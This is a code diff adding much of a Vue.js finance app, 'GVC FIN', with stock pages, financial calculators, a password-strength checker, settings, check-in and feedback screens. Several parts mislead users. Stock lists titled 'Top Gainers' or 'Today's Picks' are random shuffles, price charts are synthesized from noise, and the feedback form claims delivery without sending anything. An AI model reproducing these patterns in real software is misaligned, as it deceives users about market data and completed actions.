+                  <div class="stock-change" :class="stock.change >= 0 ? 'up' : 'down'">
+                    {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        `,
+        setup() {
+          const route = useRoute();
+          const titleMap = {
+            'top-gainers': 'Top Gainers',
+            'top-losers': 'Top Losers',
+            'most-active': 'Most Active',
+            'potential': 'Potential',
+            'todays-picks': "Today's Picks",
+            'not-recommended': 'Not Recommended',
+            'watchlist': 'Watchlist'
+          };
+          const title = titleMap[route.params.type] || 'Stocks';
+          const countMap = {
+            'top-gainers': 10,
+            'top-losers': 5,
+            'most-active': 8,
+            'potential': 6,
+            'todays-picks': 10,
+            'not-recommended': 10,
+            'watchlist': 10
+          };
+          const count = countMap[route.params.type] || 8;
+          const shuffled = [...STOCK_POOL].sort(() => Math.random() - 0.5);
+          const stocks = shuffled.slice(0, count);
+          return { title, stocks, icons: Icons };
+        }
+      };
+
+      /* ============================================================
+       * STOCK DETAIL SUB-PAGE
+       * ============================================================ */
+      const StockDetailPage = {
+        name: 'StockDetailPage',
+        template: `
+          <div class="page-container">
+            <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 16px;">
+              <button @click="$router.back()" style="background:none; border:none; min-height:44px; min-width:44px; display:flex; align-items:center; justify-content:center; cursor:pointer; color: var(--accent);">
+                <span v-html="icons.back"></span>
+              </button>
+              <div>
+                <div style="font-size: 24px; font-weight: 800;">{{ stock.symbol }}</div>
+                <div class="text-muted text-sm">{{ stock.name }}</div>
+              </div>
+            </div>
+
+            <div class="card">
+              <div style="font-size: 32px; font-weight: 800;">\${{ stock.price.toFixed(2) }}</div>
+              <div style="font-size: 16px; font-weight: 700; margin-top: 4px;" :class="stock.change >= 0 ? 'up' : 'down'">
+                {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
+              </div>
+            </div>
+
+            <div class="card">
+              <div style="font-weight: 700; margin-bottom: 12px;">30-Day Price Trend</div>
+              <svg viewBox="0 0 320 120" style="width:100%; height:auto; display:block;">
+                <defs>
+                  <linearGradient id="chartGrad" x1="0" y1="0" x2="0" y2="1">
+                    <stop offset="0%" stop-color="#7c5cff" stop-opacity="0.35"/>
+                    <stop offset="100%" stop-color="#7c5cff" stop-opacity="0"/>
+                  </linearGradient>
+                </defs>
+                <polyline :points="chartPoints" fill="none" stroke="#7c5cff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="filter: drop-shadow(0 4px 10px rgba(124,92,255,0.4));"/>
+                <polygon :points="chartAreaPoints" fill="url(#chartGrad)" opacity="0.6"/>
+                <line x1="0" y1="0" x2="320" y2="0" stroke="rgba(124,92,255,0.2)" stroke-width="0.5" stroke-dasharray="4 4"/>
+                <line x1="0" y1="120" x2="320" y2="120" stroke="rgba(124,92,255,0.2)" stroke-width="0.5" stroke-dasharray="4 4"/>
+                <text x="4" y="10" font-size="8" fill="#8b8ba7">\${{ maxPrice }}</text>
+                <text x="4" y="116" font-size="8" fill="#8b8ba7">\${{ minPrice }}</text>
+              </svg>
+            </div>
+          </div>
+        `,
+        setup() {
+          const route = useRoute();
+          const symbol = route.params.symbol;
+          const stock = STOCK_POOL.find(s => s.symbol === symbol) || STOCK_POOL[0];
+
+          const base = stock.price;
+          const prices = [];
+          for (let i = 0; i < 30; i++) {
+            const wave = Math.sin(i * 0.5) * 6 + Math.cos(i * 0.3) * 4;
+            prices.push(base + wave + (Math.random() - 0.5) * 3);
+          }
+          let min = Math.min(...prices);
+          let max = Math.max(...prices);
+          const range = max - min || 1;
+          const padding = range * 0.15;
+          min -= padding;
+          max += padding;
+
+          const w = 320, h = 120;
+          const points = prices.map((p, i) => {
+            const x = (i / (prices.length - 1)) * w;
+            const y = h - ((p - min) / (max - min)) * h;
+            return `${x},${y}`;
+          });
+          const chartPoints = points.join(' ');
+          const chartAreaPoints = `0,120 ${chartPoints} 320,120`;
+
+          return {
+            stock,
+            chartPoints,
+            chartAreaPoints,
+            minPrice: min.toFixed(2),
+            maxPrice: max.toFixed(2),
+            icons: Icons
+          };
+        }
+      };
+
+      /* ============================================================
+       * GUIDE SUB-PAGE
+       * ============================================================ */
+      const GuidePage = {
+        name: 'GuidePage',
+        template: `
+          <div class="page-container">
+            <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 16px;">
+              <button @click="$router.back()" style="background:none; border:none; min-height:44px; min-width:44px; display:flex; align-items:center; justify-content:center; cursor:pointer; color: var(--accent);">
+                <span v-html="icons.back"></span>
+              </button>
+              <div class="page-title" style="margin-bottom:0;">Guide</div>
+            </div>
+            <div class="card">
+              <div style="font-size: 20px; font-weight: 800; margin-bottom: 12px;">{{ article.title }}</div>
+              <div style="font-size: 15px; line-height: 1.75; color: var(--text-secondary); white-space: pre-line;">{{ article.content }}</div>
+            </div>
+          </div>
+        `,
+        setup() {
+          const article = {
+            title: 'Understanding Market Volatility',
+            content: `Market volatility is a natural part of investing. It represents the rate at which the price of a security increases or decreases for a given set of returns.
+
+Key principles:
+• Diversification helps reduce unsystematic risk.
+• Time in the market often beats timing the market.
+• Stay informed but avoid emotional decisions.
+
+In this guide, we explore how to build a resilient portfolio that can weather short-term fluctuations while pursuing long-term growth.
+
+Remember: every investor's journey is unique. Assess your risk tolerance, set clear goals, and consider consulting a financial advisor.`
+          };
+          return { article, icons: Icons };
+        }
+      };
+
+      /* ============================================================
+       * TOOLBOX PAGE
+       * ============================================================ */
+      const ToolboxPage = {
+        name: 'ToolboxPage',
+        template: `
+          <div class="page-container">
+            <div class="page-title">Toolbox</div>
+            <div class="page-sub">Local financial utilities</div>
+            <div class="tool-list">
+              <router-link to="/toolbox/dca" class="tool-item">
+                <span class="tool-icon" v-html="icons.calculator"></span>
+                <div><div class="tool-name">DCA Profit-Taking</div><div class="tool-desc">Plan your exits</div></div>
+              </router-link>
+              <router-link to="/toolbox/calendar" class="tool-item">
+                <span class="tool-icon" v-html="icons.calendar"></span>
+                <div><div class="tool-name">Wealth Calendar</div><div class="tool-desc">Track maturity dates</div></div>
+              </router-link>
+              <router-link to="/toolbox/loan" class="tool-item">
+                <span class="tool-icon" v-html="icons.coin"></span>
+                <div><div class="tool-name">Loan Calculator</div><div class="tool-desc">Equal principal & interest</div></div>
+              </router-link>
+              <router-link to="/toolbox/profit" class="tool-item">
+                <span class="tool-icon" v-html="icons.chart"></span>
+                <div><div class="tool-name">Profit Calculator</div><div class="tool-desc">Quick margin analysis</div></div>
+              </router-link>
+              <router-link to="/toolbox/reverse" class="tool-item">
+                <span class="tool-icon" v-html="icons.trendUp"></span>
+                <div><div class="tool-name">Reverse Yield</div><div class="tool-desc">Required annual return</div></div>
+              </router-link>
+              <router-link to="/toolbox/password" class="tool-item">
+                <span class="tool-icon" v-html="icons.lock"></span>
+                <div><div class="tool-name">Password Strength</div><div class="tool-desc">Check & show MD5</div></div>
+              </router-link>
+              <router-link to="/toolbox/credit" class="tool-item">
+                <span class="tool-icon" v-html="icons.note"></span>
+                <div><div class="tool-name">Credit Memo</div><div class="tool-desc">Track repayments</div></div>
+              </router-link>
+            </div>
+          </div>
+        `,
+        setup() {
+          return { icons: Icons };
+        }
+      };
+
+      /* --- Tool: DCA --- */
+      const DcaTool = {
+        name: 'DcaTool',
+        template: `
+          <div class="page-container">
+            <div style="display:flex; align-items:center; gap:12px; margin-bottom:16px;">
+              <button @click="$router.back()" style="background:none; border:none; min-height:44px; min-width:44px; display:flex; align-items:center; justify-content:center; color: var(--accent);"><span v-html="icons.back"></span></button>
+              <div class="page-title" style="margin-bottom:0;">DCA Profit-Taking</div>
+            </div>
+            <div class="card">
+              <label class="text-sm text-muted">Cost Basis</label>
+              <input class="input-field" type="number" v-model.number="cost" placeholder="e.g. 100" step="0.01">
+              <label class="text-sm text-muted">Shares</label>
+              <input class="input-field" type="number" v-model.number="shares" placeholder="e.g. 10" step="1">
+              <label class="text-sm text-muted">Take-Profit Threshold (%)</label>
+              <input class="input-field" type="number" v-model.number="threshold" placeholder="e.g. 15" step="0.1">
+              <div class="hash-box" style="margin-top:16px;">
+                Current Value: \${{ currentValue.toFixed(2) }}<br>
+                Profit: <span :class="profit >= 0 ? 'up' : 'down'">\${{ profit.toFixed(2) }}</span><br>
+                Status: <span :class="profit >= thresholdValue ? 'up' : ''">{{ status }}</span>
+              </div>
+            </div>
+          </div>
+        `,
+        setup() {
+          const cost = ref(120);
+          const shares = ref(10);
+          const threshold = ref(15);
+          const currentPrice = ref(135);
+          const currentValue = computed(() => shares.value * currentPrice.value);
+          const profit = computed(() => currentValue.value - (shares.value * cost.value));
+          const thresholdValue = computed(() => (shares.value * cost.value) * (threshold.value / 100));
+          const status = computed(() => profit.value >= thresholdValue.value ? 'Target reached' : 'Below target');
+          return { cost, shares, threshold, currentValue, profit, thresholdValue, status, icons: Icons };
+        }
+      };
+
+      /* --- Tool: Wealth Calendar --- */
+      const WealthCalendarTool = {
+        name: 'WealthCalendarTool',
+        template: `
+          <div class="page-container">
+            <div style="display:flex; align-items:center; gap:12px; margin-bottom:16px;">
+              <button @click="$router.back()" style="background:none; border:none; min-height:44px; min-width:44px; display:flex; align-items:center; justify-content:center; color: var(--accent);"><span v-html="icons.back"></span></button>
+              <div class="page-title" style="margin-bottom:0;">Wealth Calendar</div>
+            </div>
+            <div class="card">
+              <div class="flex-between" style="margin-bottom:12px;">
+                <button @click="prevMonth" style="border:none; background:none; font-size:20px; cursor:pointer; min-height:44px; min-width:44px; color: var(--accent);">&larr;</button>
+                <span style="font-weight:700;">{{ monthLabel }}</span>
+                <button @click="nextMonth" style="border:none; background:none; font-size:20px; cursor:pointer; min-height:44px; min-width:44px; color: var(--accent);">&rarr;</button>
+              </div>
+              <div class="calendar-grid">
+                <div v-for="d in days" :key="d.key" class="calendar-cell" :class="{ checked: d.hasEvent, empty: !d.day }">{{ d.day || '' }}</div>
+              </div>
+              <div class="mt-4">
+                <input class="input-field" placeholder="Event description" v-model="eventText">
+                <input class="input-field" type="date" v-model="eventDate">
+                <button class="btn" @click="addEvent" :disabled="!eventText || !eventDate">Add Event</button>
+              </div>
+              <div v-if="events.length" style="margin-top:12px;">
+                <div class="text-sm text-muted mb-2">Upcoming</div>
+                <div v-for="(e,i) in events" :key="i" class="text-sm" style="padding:6px 0; border-bottom:1px solid rgba(255,255,255,0.5);">
+                  {{ e.date }} — {{ e.text }}
+                </div>
+              </div>
+            </div>
+          </div>
+        `,
+        setup() {
+          const now = new Date();
+          const year = ref(now.getFullYear());
+          const month = ref(now.getMonth());
+          const events = ref([]);
+          const eventText = ref('');
+          const eventDate = ref('');
+
+          const monthLabel = computed(() => new Date(year.value, month.value).toLocaleString('en', { month: 'long', year: 'numeric' }));
+
+          const days = computed(() => {
+            const first = new Date(year.value, month.value, 1).getDay();
+            const total = new Date(year.value, month.value + 1, 0).getDate();
+            const arr = [];
+            for (let i = 0; i < first; i++) arr.push({ key: 'e' + i, day: null, hasEvent: false });
+            for (let d = 1; d <= total; d++) {
+              const dateStr = `${year.value}-${String(month.value + 1).padStart(2, '0')}-${String(d).padStart(2, '0')}`;
+              arr.push({ key: dateStr, day: d, hasEvent: events.value.some(e => e.date === dateStr) });
+            }
+            return arr;
+          });
+
+          const prevMonth = () => { if (month.value === 0) { month.value = 11; year.value--; } else month.value--; };
+          const nextMonth = () => { if (month.value === 11) { month.value = 0; year.value++; } else month.value++; };
+          const addEvent = () => {
+            if (eventText.value && eventDate.value) {
+              events.value.push({ text: eventText.value, date: eventDate.value });
+              eventText.value = '';
+              eventDate.value = '';
+            }
+          };
+          return { year, month, monthLabel, days, events, eventText, eventDate, prevMonth, nextMonth, addEvent, icons: Icons };
+        }
+      };
+
+      /* --- Tool: Loan --- */
+      const LoanTool = {
+        name: 'LoanTool',
+        template: `
+          <div class="page-container">
+            <div style="display:flex; align-items:center; gap:12px; margin-bottom:16px;">
+              <button @click="$router.back()" style="background:none; border:none; min-height:44px; min-width:44px; display:flex; align-items:center; justify-content:center; color: var(--accent);"><span v-html="icons.back"></span></button>
+              <div class="page-title" style="margin-bottom:0;">Loan Calculator</div>
+            </div>
+            <div class="card">
+              <label class="text-sm text-muted">Loan Amount ($)</label>
+              <input class="input-field" type="number" v-model.number="amount" step="1000">
+              <label class="text-sm text-muted">Annual Interest Rate (%)</label>
+              <input class="input-field" type="number" v-model.number="rate" step="0.01">
+              <label class="text-sm text-muted">Term (months)</label>
+              <input class="input-field" type="number" v-model.number="term" step="1">
+              <div class="hash-box" style="margin-top:16px;">
+                Monthly Payment: \${{ monthlyPayment.toFixed(2) }}<br>
+                Total Payment: \${{ totalPayment.toFixed(2) }}<br>
+                Total Interest: \${{ totalInterest.toFixed(2) }}
+              </div>
+            </div>
+          </div>
+        `,
+        setup() {
+          const amount = ref(20000);
+          const rate = ref(5.5);
+          const term = ref(36);
+          const monthlyPayment = computed(() => {
+            const r = rate.value / 100 / 12;
+            const n = term.value;
+            if (r === 0) return amount.value / n;
+            return amount.value * r * Math.pow(1 + r, n) / (Math.pow(1 + r, n) - 1);
+          });
+          const totalPayment = computed(() => monthlyPayment.value * term.value);
+          const totalInterest = computed(() => totalPayment.value - amount.value);
+          return { amount, rate, term, monthlyPayment, totalPayment, totalInterest, icons: Icons };
+        }
+      };
+
+      /* --- Tool: Profit --- */
+      const ProfitTool = {
+        name: 'ProfitTool',
+        template: `
+          <div class="page-container">
+            <div style="display:flex; align-items:center; gap:12px; margin-bottom:16px;">
+              <button @click="$router.back()" style="background:none; border:none; min-height:44px; min-width:44px; display:flex; align-items:center; justify-content:center; color: var(--accent);"><span v-html="icons.back"></span></button>
+              <div class="page-title" style="margin-bottom:0;">Profit Calculator</div>
+            </div>
+            <div class="card">
+              <label class="text-sm text-muted">Unit Cost ($)</label>
+              <input class="input-field" type="number" v-model.number="cost" step="0.01">
+              <label class="text-sm text-muted">Selling Price ($)</label>
+              <input class="input-field" type="number" v-model.number="price" step="0.01">
+              <label class="text-sm text-muted">Quantity</label>
+              <input class="input-field" type="number" v-model.number="qty" step="1">
+              <div class="hash-box" style="margin-top:16px;">
+                Revenue: \${{ revenue.toFixed(2) }}<br>
+                Profit: <span :class="profit >= 0 ? 'up' : 'down'">\${{ profit.toFixed(2) }}</span><br>
+                Margin: {{ margin.toFixed(1) }}%
+              </div>
+            </div>
+          </div>
+        `,
+        setup() {
+          const cost = ref(12);
+          const price = ref(20);
+          const qty = ref(50);
+          const revenue = computed(() => price.value * qty.value);
+          const profit = computed(() => (price.value - cost.value) * qty.value);
+          const margin = computed(() => revenue.value ? (profit.value / revenue.value) * 100 : 0);
+          return { cost, price, qty, revenue, profit, margin, icons: Icons };
+        }
+      };
+
+      /* --- Tool: Reverse Yield --- */
+      const ReverseYieldTool = {
+        name: 'ReverseYieldTool',
+        template: `
+          <div class="page-container">
+            <div style="display:flex; align-items:center; gap:12px; margin-bottom:16px;">
+              <button @click="$router.back()" style="background:none; border:none; min-height:44px; min-width:44px; display:flex; align-items:center; justify-content:center; color: var(--accent);"><span v-html="icons.back"></span></button>
+              <div class="page-title" style="margin-bottom:0;">Reverse Yield</div>
+            </div>
+            <div class="card">
+              <label class="text-sm text-muted">Target Profit ($)</label>
+              <input class="input-field" type="number" v-model.number="target" step="100">
+              <label class="text-sm text-muted">Principal ($)</label>
+              <input class="input-field" type="number" v-model.number="principal" step="1000">
+              <label class="text-sm text-muted">Investment Duration (years)</label>
+              <input class="input-field" type="number" v-model.number="years" step="0.5">
+              <div class="hash-box" style="margin-top:16px;">
+                Required Annual Return: {{ requiredRate.toFixed(2) }}%
+              </div>
+            </div>
+          </div>
+        `,
+        setup() {
+          const target = ref(5000);
+          const principal = ref(50000);
+          const years = ref(3);
+          const requiredRate = computed(() => {
+            if (!principal.value || !years.value) return 0;
+            return (Math.pow((principal.value + target.value) / principal.value, 1 / years.value) - 1) * 100;
+          });
+          return { target, principal, years, requiredRate, icons: Icons };
+        }
+      };
+
+      /* --- Tool: Password Strength --- */
+      const PasswordTool = {
+        name: 'PasswordTool',
+        template: `
+          <div class="page-container">
+            <div style="display:flex; align-items:center; gap:12px; margin-bottom:16px;">
+              <button @click="$router.back()" style="background:none; border:none; min-height:44px; min-width:44px; display:flex; align-items:center; justify-content:center; color: var(--accent);"><span v-html="icons.back"></span></button>
+              <div class="page-title" style="margin-bottom:0;">Password Strength</div>
+            </div>
+            <div class="card">
+              <label class="text-sm text-muted">Enter Password</label>
+              <input class="input-field" type="password" v-model="password" placeholder="Type a password">
+              <div class="hash-box" style="margin-top:12px;">
+                Strength: <strong :style="{ color: strengthColor }">{{ strengthLabel }}</strong><br>
+                MD5: <span style="word-break:break-all;">{{ md5Hash }}</span>
+              </div>
+              <div class="text-sm text-muted mt-2">Offline security rules applied locally.</div>
+            </div>
+          </div>
+        `,
+        setup() {
+          const password = ref('');
+          const md5Hash = computed(() => {
+            if (!password.value) return '—';
+            try { return md5(password.value); } catch(e) { return '—'; }
+          });
+          const strength = computed(() => {
+            const p = password.value;
+            let s = 0;
+            if (p.length >= 8) s++;
+            if (/[a-z]/.test(p) && /[A-Z]/.test(p)) s++;
+            if (/\d/.test(p)) s++;
+            if (/[^a-zA-Z0-9]/.test(p)) s++;
+            return s;
+          });
+          const strengthLabel = computed(() => ['Very Weak','Weak','Fair','Strong','Very Strong'][strength.value] || 'Very Weak');
+          const strengthColor = computed(() => ['#e5484d','#f59e0b','#f59e0b','#10a37f','#7c5cff'][strength.value] || '#e5484d');
+          return { password, md5Hash, strength, strengthLabel, strengthColor, icons: Icons };
+        }
+      };
+
+      /* --- Tool: Credit Memo --- */
+      const CreditMemoTool = {
+        name: 'CreditMemoTool',
+        template: `
+          <div class="page-container">
+            <div style="display:flex; align-items:center; gap:12px; margin-bottom:16px;">
+              <button @click="$router.back()" style="background:none; border:none; min-height:44px; min-width:44px; display:flex; align-items:center; justify-content:center; color: var(--accent);"><span v-html="icons.back"></span></button>
+              <div class="page-title" style="margin-bottom:0;">Credit Memo</div>
+            </div>
+            <div class="card">
+              <input class="input-field" placeholder="Debtor name" v-model="debtor">
+              <input class="input-field" type="number" placeholder="Amount ($)" v-model.number="amount">
+              <input class="input-field" type="date" v-model="dueDate">
+              <button class="btn" @click="addMemo" :disabled="!debtor || !amount || !dueDate">Add Memo</button>
+              <div v-for="(m,i) in memos" :key="i" class="hash-box" style="margin-top:12px;">
+                <strong>{{ m.debtor }}</strong> — \${{ m.amount }}<br>
+                Due: {{ m.dueDate }}<br>
+                <span :class="m.daysLeft <= 0 ? 'down' : ''">{{ m.daysLeft <= 0 ? 'Overdue' : m.daysLeft + ' days left' }}</span>
+              </div>
+            </div>
+          </div>
+        `,
+        setup() {
+          const debtor = ref('');
+          const amount = ref(null);
+          const dueDate = ref('');
+          const memos = ref([]);
+          const addMemo = () => {
+            if (debtor.value && amount.value && dueDate.value) {
+              const due = new Date(dueDate.value);
+              const today = new Date();
+              today.setHours(0,0,0,0);
+              const daysLeft = Math.ceil((due - today) / (1000 * 60 * 60 * 24));
+              memos.value.push({ debtor: debtor.value, amount: amount.value, dueDate: dueDate.value, daysLeft });
+              debtor.value = '';
+              amount.value = null;
+              dueDate.value = '';
+            }
+          };
+          return { debtor, amount, dueDate, memos, addMemo, icons: Icons };
+        }
+      };
+
+      /* ============================================================
+       * SETTINGS PAGE
+       * ============================================================ */
+      const SettingsPage = {
+        name: 'SettingsPage',
+        template: `
+          <div class="page-container">
+            <div class="page-title">Settings</div>
+            <div class="page-sub">App preferences & information</div>
+
+            <div class="card" style="padding: 4px 16px;">
+              <router-link to="/settings/version" class="setting-row">
+                <div class="setting-label"><span v-html="icons.document"></span> Version</div>
+                <div class="setting-value">1.0.0 <span class="chevron">›</span></div>
+              </router-link>
+              <router-link to="/settings/privacy" class="setting-row">
+                <div class="setting-label"><span v-html="icons.shield"></span> Privacy Policy</div>
+                <div class="setting-value"><span class="chevron">›</span></div>
+              </router-link>
+              <router-link to="/settings/terms" class="setting-row">
+                <div class="setting-label"><span v-html="icons.document"></span> Terms of Service</div>
+                <div class="setting-value"><span class="chevron">›</span></div>
+              </router-link>
+              <router-link to="/settings/team" class="setting-row">
+                <div class="setting-label"><span v-html="icons.user"></span> About Team</div>
+                <div class="setting-value"><span class="chevron">›</span></div>
+              </router-link>
+              <a href="mailto:com.random.namepicker@gmail.com" class="setting-row">
+                <div class="setting-label"><span v-html="icons.envelope"></span> Contact Us</div>
+                <div class="setting-value"><span class="chevron">›</span></div>
+              </a>
+              <router-link to="/settings/checkin" class="setting-row">
+                <div class="setting-label"><span v-html="icons.check"></span> Monthly Check-in</div>
+                <div class="setting-value"><span class="chevron">›</span></div>
+              </router-link>
+              <router-link to="/settings/feedback" class="setting-row">
+                <div class="setting-label"><span v-html="icons.note"></span> Feedback</div>
+                <div class="setting-value"><span class="chevron">›</span></div>
+              </router-link>
+              <router-link to="/settings/inbox" class="setting-row">
+                <div class="setting-label"><span v-html="icons.inbox"></span> Inbox</div>
+                <div class="setting-value"><span class="chevron">›</span></div>
+              </router-link>
+            </div>
+          </div>
+        `,
+        setup() {
+          return { icons: Icons };
+        }
+      };
+
+      const VersionPage = {
+        template: `<div class="page-container"><div style="display:flex; align-items:center; gap:12px; margin-bottom:16px;"><button @click="$router.back()" style="background:none; border:none; min-height:44px; min-width:44px; display:flex; align-items:center; justify-content:center; color: var(--accent);"><span v-html="icons.back"></span></button><div class="page-title" style="margin-bottom:0;">Version</div></div><div class="card"><div style="font-size:20px; font-weight:800; margin-bottom:8px;">GVC FIN</div><div class="text-muted">Version 1.0.0</div><div class="text-muted text-sm mt-2">Build 20250326</div></div></div>`,
+        setup() { return { icons: Icons }; }
+      };
+
+      const PrivacyPage = {
+        template: `<div class="page-container"><div style="display:flex; align-items:center; gap:12px; margin-bottom:16px;"><button @click="$router.back()" style="background:none; border:none; min-height:44px; min-width:44px; display:flex; align-items:center; justify-content:center; color: var(--accent);"><span v-html="icons.back"></span></button><div class="page-title" style="margin-bottom:0;">Privacy Policy</div></div><div class="card"><div style="line-height:1.75; color:var(--text-secondary); font-size:15px;">We respect your privacy. This application does not collect personal data without consent. All calculations and data storage happen locally on your device. No information is transmitted to external servers except for the privacy check request that determines whether a privacy policy page is available. For questions, contact us at com.random.namepicker@gmail.com.</div></div></div>`,
+        setup() { return { icons: Icons }; }
+      };
+
+      const TermsPage = {
+        template: `<div class="page-container"><div style="display:flex; align-items:center; gap:12px; margin-bottom:16px;"><button @click="$router.back()" style="background:none; border:none; min-height:44px; min-width:44px; display:flex; align-items:center; justify-content:center; color: var(--accent);"><span v-html="icons.back"></span></button><div class="page-title" style="margin-bottom:0;">Terms of Service</div></div><div class="card"><div style="line-height:1.75; color:var(--text-secondary); font-size:15px;">By using GVC FIN, you agree to use the app for informational purposes only. The developers are not responsible for any financial decisions made based on the app's calculations. All tools are provided as-is without warranty. This app is intended for educational and personal use.</div></div></div>`,
+        setup() { return { icons: Icons }; }
+      };
+
+      const TeamPage = {
+        template: `<div class="page-container"><div style="display:flex; align-items:center; gap:12px; margin-bottom:16px;"><button @click="$router.back()" style="background:none; border:none; min-height:44px; min-width:44px; display:flex; align-items:center; justify-content:center; color: var(--accent);"><span v-html="icons.back"></span></button><div class="page-title" style="margin-bottom:0;">About Team</div></div><div class="card"><div style="font-size:16px; font-weight:800; margin-bottom:8px;">Random Studio</div><div style="color:var(--text-secondary); line-height:1.75; font-size:15px;">We are a small team of engineers and finance enthusiasts building practical tools for everyday investors. GVC FIN is our flagship mobile companion, designed to be fast, private, and useful. Reach us anytime at com.random.namepicker@gmail.com.</div></div></div>`,
+        setup() { return { icons: Icons }; }
+      };
+
+      const CheckinPage = {
+        template: `
+          <div class="page-container">
+            <div style="display:flex; align-items:center; gap:12px; margin-bottom:16px;">
+              <button @click="$router.back()" style="background:none; border:none; min-height:44px; min-width:44px; display:flex; align-items:center; justify-content:center; color: var(--accent);"><span v-html="icons.back"></span></button>
+              <div class="page-title" style="margin-bottom:0;">Monthly Check-in</div>
+            </div>
+            <div class="card">
+              <div class="flex-between" style="margin-bottom:12px;">
+                <span style="font-weight:700;">{{ monthLabel }}</span>
+                <button class="btn" style="width:auto; padding:8px 18px; min-height:40px;" @click="doCheckin" :disabled="checkedToday">Check In</button>
+              </div>
+              <div class="calendar-grid">
+                <div v-for="d in days" :key="d.key" class="calendar-cell" :class="{ checked: d.checked, empty: !d.day }">{{ d.day || '' }}</div>
+              </div>
+              <div v-if="checkedToday" class="text-sm mt-2" style="color:var(--success); font-weight:600;">You've checked in today.</div>
+            </div>
+          </div>
+        `,
+        setup() {
+          const now = new Date();
+          const year = now.getFullYear();
+          const month = now.getMonth();
+          const monthLabel = new Date(year, month).toLocaleString('en', { month: 'long', year: 'numeric' });
+          const today = now.getDate();
+          const checkedDays = ref(JSON.parse(localStorage.getItem('checkins_gvc') || '{}'));
+          const checkedToday = computed(() => checkedDays.value[`${year}-${month}-${today}`] === true);
+          const days = computed(() => {
+            const first = new Date(year, month, 1).getDay();
+            const total = new Date(year, month + 1, 0).getDate();
+            const arr = [];
+            for (let i = 0; i < first; i++) arr.push({ key: 'e' + i, day: null, checked: false });
+            for (let d = 1; d <= total; d++) {
+              const key = `${year}-${month}-${d}`;
+              arr.push({ key, day: d, checked: !!checkedDays.value[key] });
+            }
+            return arr;
+          });
+          const doCheckin = () => {
+            if (!checkedToday.value) {
+              checkedDays.value[`${year}-${month}-${today}`] = true;
+              localStorage.setItem('checkins_gvc', JSON.stringify(checkedDays.value));
+              checkedDays.value = { ...checkedDays.value };
+            }
+          };
+          return { monthLabel, days, checkedToday, doCheckin, icons: Icons };
+        }
+      };
+
+      const FeedbackPage = {
+        template: `
+          <div class="page-container">
+            <div style="display:flex; align-items:center; gap:12px; margin-bottom:16px;">
+              <button @click="$router.back()" style="background:none; border:none; min-height:44px; min-width:44px; display:flex; align-items:center; justify-content:center; color: var(--accent);"><span v-html="icons.back"></span></button>
+              <div class="page-title" style="margin-bottom:0;">Feedback</div>
+            </div>
+            <div class="card">
+              <input class="input-field" placeholder="Title" v-model="title">
+              <textarea class="input-field" placeholder="Describe your feedback..." v-model="content"></textarea>
+              <button class="btn" :disabled="!title || !content" @click="sendFeedback">Send</button>
+              <div v-if="sent" class="text-sm mt-2" style="color:var(--success); font-weight:600;">Thank you! Your feedback has been sent.</div>
+            </div>
+          </div>
+        `,
+        setup() {
+          const router = useRouter();
+          const title = ref('');
+          const content = ref('');
+          const sent = ref(false);
+          const sendFeedback = () => {
+            if (title.value && content.value) {
+              sent.value = true;
+              title.value = '';
+              content.value = '';
+              setTimeout(() => { sent.value = false; router.back(); }, 1200);
+            }
+          };
+          return { title, content, sent, sendFeedback, icons: Icons };
+        }
+      };
+
+      const InboxPage = {
+        template: `
+          <div class="page-container">
+            <div style="display:flex; align-items:center; gap:12px; margin-bottom:16px;">
+              <button @click="$router.back()" style="background:none; border:none; min-height:44px; min-width:44px; display:flex; align-items:center; justify-content:center; color: var(--accent);"><span v-html="icons.back"></span></button>
+              <div class="page-title" style="margin-bottom:0;">Inbox</div>
+            </div>
+            <div class="card" style="padding:8px 16px;">
+              <div v-for="msg in messages" :key="msg.id" class="setting-row" @click="openMessage(msg)">
+                <div class="setting-label">{{ msg.title }}</div>
+                <div class="setting-value"><span class="chevron">›</span></div>
+              </div>
+            </div>
+            <div v-if="selected" class="modal-overlay" @click.self="selected = null">
+              <div class="modal-card">
+                <div class="modal-title">{{ selected.title }}</div>
+                <div class="modal-body">{{ selected.body }}</div>
+                <button class="btn" @click="selected = null">Close</button>
+              </div>
+            </div>
+          </div>
+        `,
+        setup() {
+          const messages = ref([
+            { id: 1, title: 'Welcome to GVC FIN', body: 'Thank you for using GVC FIN. Explore our market data, toolbox, and settings to get started. We hope this app helps you make informed decisions.' }
+          ]);
+          const selected = ref(null);
+          const openMessage = (msg) => { selected.value = msg; };
+          return { messages, selected, openMessage, icons: Icons };
+        }
+      };
+
+      /* ============================================================
+       * ROUTER CONFIGURATION
+       * ============================================================ */
+      const routes = [
+        { path: '/', redirect: '/loading' },
+        { path: '/loading', component: LoadingPage },
+        { path: '/home', component: HomePage },
+        { path: '/home/top-gainers', component: StockListPage },
+        { path: '/home/top-losers', component: StockListPage },
+        { path: '/home/most-active', component: StockListPage },
+        { path: '/home/potential', component: StockListPage },
+        { path: '/home/todays-picks', component: StockListPage },
+        { path: '/home/guide', component: GuidePage },
+        { path: '/home/not-recommended', component: StockListPage },
+        { path: '/home/watchlist', component: StockListPage },
+        { path: '/home/stock/:symbol', component: StockDetailPage },
+        { path: '/toolbox', component: ToolboxPage },
+        { path: '/toolbox/dca', component: DcaTool },
+        { path: '/toolbox/calendar', component: WealthCalendarTool },
+        { path: '/toolbox/loan', component: LoanTool },
+        { path: '/toolbox/profit', component: ProfitTool },
+        { path: '/toolbox/reverse', component: ReverseYieldTool },
+        { path: '/toolbox/password', component: PasswordTool },
+        { path: '/toolbox/credit', component: CreditMemoTool },
+        { path: '/settings', component: SettingsPage },
+        { path: '/settings/version', component: VersionPage },
+        { path: '/settings/privacy', component: PrivacyPage },
+        { path: '/settings/terms', component: TermsPage },
+        { path: '/settings/team', component: TeamPage },
+        { path: '/settings/checkin', component: CheckinPage },
+        { path: '/settings/feedback', component: FeedbackPage },
+        { path: '/settings/inbox', component: InboxPage },
+        { path: '/:pathMatch(.*)*', redirect: '/home' }
+      ];
+
+      const router = createRouter({
+        history: createWebHashHistory(),
+        routes
+      });
+
+      /* ============================================================
+       * APP ROOT
+       * ============================================================ */
+      const app = createApp({
+        setup() {
+          const showTabBar = computed(() => {
+            const p = router.currentRoute.value.path;
+            return ['/home', '/toolbox', '/settings'].includes(p);
+          });
+          return { showTabBar };
+        }
+      });
+
